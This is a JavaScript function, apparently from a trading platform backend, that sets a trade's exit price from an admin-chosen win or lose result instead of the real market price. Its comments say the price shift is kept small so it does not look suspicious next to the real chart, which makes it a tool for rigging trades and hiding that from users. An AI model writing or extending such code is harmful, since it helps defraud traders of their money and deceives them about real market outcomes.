// Calculate a realistic exit price based on the entry, direction, and admin result
function calculateExitPrice(entryPrice, direction, adminResult, payoutPercent) {
  const entry = Number(entryPrice);
  
  // Tiny, realistic price movement: 0.05% – 0.15%
  // This keeps the exit price very close to the entry, so it doesn't
  // look suspicious compared to the real market chart.
  const pct = 0.0008; // 0.08% — realistic BTC movement in 1–2 minutes

  if (adminResult === "win") {
    if (direction === "long") {
      return +(entry * (1 + pct)).toFixed(2);   // Long win → price UP slightly
    } else {
      return +(entry * (1 - pct)).toFixed(2);   // Short win → price DOWN slightly
    }
  }

  if (adminResult === "lose") {
    if (direction === "long") {
      return +(entry * (1 - pct)).toFixed(2);   // Long lose → price DOWN slightly
    } else {
      return +(entry * (1 + pct)).toFixed(2);   // Short lose → price UP slightly
    }
  }

  // Neutral → almost no change
  return +(entry * (1 + (Math.random() - 0.5) * 0.0002)).toFixed(2);
}
